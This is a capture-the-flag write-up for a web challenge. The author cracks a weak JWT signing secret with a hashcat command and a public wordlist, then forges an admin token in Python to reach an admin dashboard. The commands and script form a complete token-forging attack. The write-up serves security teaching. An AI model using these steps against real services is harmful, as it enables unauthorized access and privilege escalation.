# Secret Event

**Author**: carax49<br>
**Date**: 2026-08-23

## Overview

- Category: Web
- Description:

```text
You can't just make stuff up
```

## Analysis

After creating an account and logging into the system

<img src=./images/image.png style="border-radius: 3px;">

I tried accessing the `Admin dashboard` and got

```text
Access denied.
```

I intercepted the request with BurpSuite

<img src=./images/image-1.png style="border-radius: 3px;">

And I noticed the JWT:

```text
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJjYXJheCIsIm5hbWUiOiJjYXJheCIsInJvbGUiOiJ1c2VyIiwiaWF0IjoxNzg3NTU1NzAxMDg3fQ.b8-YJsLHHGs3WlFeiTN0bg4fYHQlw3x_thQWim3ibUc
```

The vulnerability is very likely in this JWT

## Solution

When I decoded the JWT, I got:

```json
Header:

{
    "alg": "HS256",
    "typ": "JWT"
}

Payload:

{
    "sub": "carax",
    "name": "carax",
    "role": "user",
    "iat": 1787555701087
}

...
```

I wanted to check whether this JWT was using a weak secret key. To do that, I brute-forced the key with `hashcat` using the wordlist [jwt.secrets.list](https://github.com/wallarm/jwt-secrets/blob/master/jwt.secrets.list)

```bash
hashcat -m 16500 -a 0 "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJjYXJheCIsIm5hbWUiOiJjYXJheCIsInJvbGUiOiJ1c2VyIiwiaWF0IjoxNzg3NTU1NzAxMDg3fQ.b8-YJsLHHGs3WlFeiTN0bg4fYHQlw3x_thQWim3ibUc" ./jwt.secrets.list 
```

And I found the key to be

```text
secret
```

With the secret key found, I wrote the following Python script to forge a new JWT with `"role": "admin"`

```python
import jwt
import time

token = jwt.encode(
    {
        "sub": "carax",
        "name": "carax",
        "role": "admin",
        "iat": int(time.time())
    },
    "secret",
    algorithm="HS256"
)

print(token)
```

And I got a new JWT:

```text
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJjYXJheCIsIm5hbWUiOiJjYXJheCIsInJvbGUiOiJhZG1pbiIsImlhdCI6MTc4NzU1NzYyNH0.uQX9zWlXI7haEgi2RaZT-Q89CixLHGd21T_oXZccETk
```

After sending the payload with the new JWT, I got the following response:

<img src=./images/image-2.png style="border-radius: 3px;">

And when I swapped the JWT in the browser, the flag was right there

<img src=./images/image-3.png style="border-radius: 3px;">

## Flag

```text
brunner{well_known_secret}
```